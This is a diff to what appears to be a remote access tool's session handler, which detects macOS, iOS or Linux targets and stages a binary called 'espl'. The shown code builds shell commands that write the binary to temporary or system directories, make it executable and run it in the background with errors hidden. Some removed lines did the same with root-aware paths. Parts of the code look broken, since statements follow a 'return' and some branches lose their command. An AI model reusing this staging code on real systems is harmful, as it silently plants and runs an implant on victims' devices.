@@ -499,8 +499,7 @@ class SessionHandler:
             payload = binaryFile.read()
             binaryFile.close()
             preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
-	    #this looks hella weird lmfaooo
-            preload = "export dti='/tmp/'; if [ $UID == "0" ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod +x $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+	    #this looks hella weird lmfaooo            
         elif "arm" in CDA:
             if verbose:
                 print strinfo("Detected iOS")
@@ -517,8 +516,7 @@ class SessionHandler:
             return
             binaryFile = open("src/binaries/esplinux", "rb")
             payload = binaryFile.read()
-            binaryFile.close()
-            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+            binaryFile.close()           
         else:
             if verbose:
                 print strinfo("device unrecognized")
